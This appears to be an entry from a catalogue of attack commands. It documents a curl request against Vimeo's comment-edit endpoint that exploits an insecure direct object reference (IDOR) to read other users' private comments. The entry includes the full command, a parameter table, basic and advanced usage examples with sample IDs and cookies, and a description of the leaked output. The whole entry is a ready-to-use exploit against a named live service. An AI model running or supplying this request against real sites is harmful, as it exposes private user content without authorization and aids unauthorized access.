---
id: cmd-uuid-1
data: >-
  curl
  "https://vimeo.com/<video_id>?comment_id=<comment_id>&is_sticky=0&action=comment_edit_form"
  -H "Cookie: session=<session_value>" -s
tags:
  - web
  - exploit
  - curl
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.393Z'
verified: false
validated: true
submitted: true
---
# curl-vimeo-comment-edit

## Command

```bash
curl "https://vimeo.com/<video_id>?comment_id=<comment_id>&is_sticky=0&action=comment_edit_form" -H "Cookie: session=<session_value>" -s
```

## Description

This curl command sends a GET request to Vimeo's comment edit endpoint, exploiting IDOR by specifying a target comment_id to retrieve private comment content without proper authorization. Use it to test access to restricted comments on private videos.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<video_id>` | The ID of the target video | Yes |
| `<comment_id>` | The ID of the private comment to access | Yes |
| `&is_sticky=0` | Parameter to indicate non-sticky comment (default for edit) | Yes |
| `&action=comment_edit_form` | Specifies the edit form action | Yes |
| `-H "Cookie: session=<session_value>"` | Authentication cookie for unauthorized account | Yes |
| `-s` | Silent mode to suppress progress meter | No |

## Examples

### Basic Usage

```bash
curl "https://vimeo.com/123456789?comment_id=1301116&is_sticky=0&action=comment_edit_form" -H "Cookie: session=abc123" -s
```

### Advanced Usage

```bash
curl "https://vimeo.com/123456789?comment_id=1301116&is_sticky=0&action=comment_edit_form" -H "Cookie: session=abc123" -H "User-Agent: Mozilla/5.0" -s | grep -i comment
```

## Expected Output

HTML response containing the comment edit form with the private comment text populated in fields, e.g., lines like <textarea>Private comment content</textarea>. If unauthorized, may return access denied, but in vulnerable state, reveals content.

## Related

- [[Related Procedure: Exploit-IDOR-in-Comment-Edit-to-Read-Private-Comment]]
